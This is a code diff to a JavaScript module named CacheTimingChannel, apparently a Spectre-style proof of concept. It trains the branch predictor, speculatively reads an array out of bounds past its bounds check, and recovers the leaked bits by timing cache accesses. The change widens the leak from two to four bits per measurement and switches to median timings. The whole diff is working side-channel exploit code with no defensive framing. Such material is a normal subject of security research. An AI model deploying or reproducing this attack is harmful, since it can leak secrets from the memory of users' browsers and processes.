@@ -7,8 +7,10 @@ const Timer = WorkerTimer;
 const PAGE_SIZE = 4 * 1024;
 const PADDING = 2 * PAGE_SIZE;
 const BUFFER_OFFSET = PADDING;
-const TRAINING_ITERATIONS = 10;
-const MEASURE_ITERATIONS = 10;
+const TRAINING_ITERATIONS = 7;
+const MEASURED_ITERATIONS = 7;
+const ALL_ITERATIONS = TRAINING_ITERATIONS + MEASURED_ITERATIONS;
+const MAX_LEAK_AT_ONCE = 16;
 
 function minIndex(arr) {
   var mini = -1, minv = 0;
@@ -22,7 +24,7 @@ function minIndex(arr) {
   return mini;
 }
 
-export function until_agreement(fn, timeout_iterations=100) {
+export function until_agreement(fn, timeout_iterations=50) {
   var h1 = -1, h2 = -1, h3 = -1;
   for (var iter = 0; iter < timeout_iterations; iter++) {
     const current = fn();
@@ -37,10 +39,12 @@ export function until_agreement(fn, timeout_iterations=100) {
 
 const _timer = new Timer();
 let _junk = 0;
-const _times = new Float64Array(16);
+const _times = new Float64Array(ALL_ITERATIONS * MAX_LEAK_AT_ONCE);
+const _time_slice = new Float64Array(MEASURED_ITERATIONS);
+const _time_medians = new Float64Array(MAX_LEAK_AT_ONCE);
 
 // must be power of two so the index masking logic doesn't break in measure
-const _buffer = new Uint8Array(2 * 16 * PAGE_SIZE);
+const _buffer = new Uint8Array(2 * MAX_LEAK_AT_ONCE * PAGE_SIZE);
 const _buffer_length = _buffer.length;
 
 const _evict = new Int32Array(16 * 1024 * 1024);
@@ -71,7 +75,14 @@ function measure_without_agreement() {
     _timer.stop();
   }
   // console.log(this._times);
-  const result = minIndex(_times);
+  for (var i = 0; i < MAX_LEAK_AT_ONCE; i++) {
+    for (var j = 0; j < MEASURED_ITERATIONS; j++) {
+      _time_slice[j] = _times[(j + TRAINING_ITERATIONS) * MAX_LEAK_AT_ONCE + i];
+    }
+    _time_slice.sort();
+    _time_medians[i] = _time_slice[Math.floor(MEASURED_ITERATIONS / 2)];
+  }
+  const result = minIndex(_time_medians);
   // console.log(result);
   return result;
 }
@@ -81,12 +92,12 @@ function measure_times_single_4bit() {
   const bits = BITS |0;
   var acc = 0;
 
-  for (var runId = -TRAINING_ITERATIONS; runId < MEASURE_ITERATIONS; runId++)
+  for (var runId = 0; runId < ALL_ITERATIONS; runId++)
   {
     var temp_idx = index|0;
     
     // train predictor
-    if (runId <= 0) {
+    if (runId < TRAINING_ITERATIONS) {
       temp_idx = temp_idx & 0x3;
     }
     
@@ -102,10 +113,10 @@ function measure_times_single_4bit() {
     acc ^= _buffer.length;
     */
     
-    if (temp_idx|0 < _probe.length) {
-      temp_idx = _probe[temp_idx]|0;
+    if (temp_idx < _probe.length) {
+      temp_idx = _probe[temp_idx|0]|0;
       temp_idx = (temp_idx >> bits)|0;
-      temp_idx = (temp_idx & 0x03)|0;
+      temp_idx = (temp_idx & 0x0f)|0; // MAX_LEAK_AT_ONCE
       temp_idx = (temp_idx * PAGE_SIZE)|0;
       temp_idx = (temp_idx + BUFFER_OFFSET)|0;
       // to bypass bound checking branch
@@ -116,7 +127,7 @@ function measure_times_single_4bit() {
     
     
     _timer.start();
-    for (var i = 0; i < 16; i++) {
+    for (var i = 0; i < MAX_LEAK_AT_ONCE; i++) {
       var temp_idx = i |0;
       temp_idx = temp_idx * PAGE_SIZE + BUFFER_OFFSET;
       temp_idx = temp_idx|0;
@@ -127,7 +138,7 @@ function measure_times_single_4bit() {
         let t1 = _timer.sample();
         acc ^= temp;
         const elapsed = t1 - t0;
-        _times[i] += elapsed;
+        _times[runId * MAX_LEAK_AT_ONCE + i] = elapsed;
       }
     }
     _timer.stop();
@@ -139,5 +150,4 @@ function measure_times_single_4bit() {
 
   _junk ^= acc;
 }  
-
 export const CacheTimingChannel = { measure };
